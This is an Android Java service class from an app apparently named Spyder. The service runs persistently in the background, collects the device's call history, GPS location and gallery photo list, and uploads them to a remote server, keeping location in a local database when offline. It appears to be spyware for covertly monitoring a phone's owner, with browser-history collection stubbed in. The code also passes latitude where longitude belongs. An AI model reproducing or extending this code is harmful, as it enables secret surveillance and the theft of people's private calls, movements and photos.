package com.spyder.app.activitys.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;
import android.widget.Toast;

import com.spyder.app.activitys.MainActivity;
import com.spyder.app.activitys.presenter.SpyderContract;
import com.spyder.app.activitys.presenter.SpyderPresenter;
import com.spyder.app.activitys.request.CallHistoryDetails;
import com.spyder.app.activitys.request.CallHistoryDetailsPojo;
import com.spyder.app.activitys.request.LocationDetail;
import com.spyder.app.activitys.request.LocationDetails;
import com.spyder.app.activitys.request.UserDetails;
import com.spyder.app.activitys.request.UserPhotoDetailList;
import com.spyder.app.activitys.response.BaseContext;
import com.spyder.app.activitys.util.CommonUtil;
import com.spyder.app.activitys.util.Constants;
import com.spyder.app.activitys.util.GetDetailsInformation;
import com.spyder.app.activitys.util.MyLog;
import com.spyder.app.activitys.util.SharedPref;
import com.spyder.app.activitys.view.activities.LocationDatabase;
import com.spyder.app.activitys.webservices.GPSTrack;
import com.spyder.app.activitys.webservices.Mediator;

import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

/**
 * Created by srisailampaka on 11/02/18.
 */

public class SpyderService extends Service implements SpyderContract.View {

    private LocationDetails locationDetails;
    private GetDetailsInformation getDetailsInformation;
    private Mediator mediator;
    private String getlangitude, getLattitude;
    private SpyderPresenter mSpyderPresenter;
    private SharedPref sharedPref;
    private GPSTrack gpsTrack;
    private Timer timer;

    @Override
    public void onCreate() {
        super.onCreate();
        mediator = Mediator.getInstance(getApplicationContext());
        mSpyderPresenter = new SpyderPresenter(this, getApplicationContext());
        sharedPref = new SharedPref(getApplicationContext());
        gpsTrack = new GPSTrack(SpyderService.this);
        getlangitude = gpsTrack.currentLangitude;
        getLattitude = gpsTrack.currentLattitude;
        timer = new Timer();
        //timerLocationOperation();
       // timerOneDayOperation();
     //call History and browserDetails
        getDetailsInformation = new GetDetailsInformation(getApplicationContext());
        //  callLocationDetails();
       //  callSaveCallHistoryDetails();

       getGalleryPhotosService();
        //getDetailsInformation.getBrowserHistory();
        //getDetailsInformation.secondmethodBrowserHistory();

    }

    private void timerLocationOperation() {
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                callLocationDetails();
            }
        }, 0, Constants.TIMER_REPEAT);
    }

    private void timerOneDayOperation() {
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                callSaveCallHistoryDetails();
                callBrowswerHistory();
            }
        }, 0, Constants.TIMER_REPEAT);
    }



    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void callBrowswerHistory() {

    }


    private void callLocationDetails() {
        if(getDetailsInformation==null) {
            getDetailsInformation = new GetDetailsInformation(getApplicationContext());
        }
        Log.v("callLocationDetails", "");
        locationDetails = new LocationDetails();
        List<LocationDetail> locationDetailList = new ArrayList<>();
        LocationDetail location = new LocationDetail();
        location.setUserId(sharedPref.getUserId());
       // location.setUserId("1");
        location.setLattitude(getLattitude);
        location.setLongitude(getLattitude);
        location.setTimestamp(String.valueOf(System.currentTimeMillis()));
        locationDetailList.add(location);
        locationDetails.setLocationDetails(locationDetailList);

        if (CommonUtil.isNetworkAvailable(getApplicationContext())) {
            mSpyderPresenter.saveLocationDetails(locationDetails);
        } else {
            LocationDatabase db = new LocationDatabase(this);
            for (int i = 0; i < locationDetails.getLocationDetails().size(); i++) {
                LocationDetail locationInfo = locationDetails.getLocationDetails().get(i);
                db.addLocationDetails(new LocationDetail(locationInfo.getUserId(), locationInfo.getLattitude(), locationInfo.getLongitude(), locationInfo.getTimestamp()));
            }

        }


    }

    public void callSaveCallHistoryDetails() {
        if(getDetailsInformation==null) {
            getDetailsInformation = new GetDetailsInformation(getApplicationContext());
        }
        CallHistoryDetails callHistoryDetails = new CallHistoryDetails();
        callHistoryDetails.setCallHistoryDetails(getDetailsInformation.getCallHistory());
       // MyLog.log("calldetails", gson.toJson(callHistoryDetails));
        //showProgressDialog();
        if(callHistoryDetails.getCallHistoryDetails().size()>0)
        {mSpyderPresenter.savecallHistoryDetails(callHistoryDetails);}
    }
    public void getGalleryPhotosService() {
        if(getDetailsInformation==null) {
            getDetailsInformation = new GetDetailsInformation(getApplicationContext());
        }
        UserPhotoDetailList userPhotoDetailList = new UserPhotoDetailList();
        userPhotoDetailList.setPhotoDetails(getDetailsInformation.fn_imagespath());
        // MyLog.log("calldetails", gson.toJson(callHistoryDetails));
        //showProgressDialog();
        mSpyderPresenter.savePhotoDetails(userPhotoDetailList);
    }



    @Override
    public void successResponse(BaseContext baseContext) {

    }

    @Override
    public void failureResponse(String error) {

    }
}
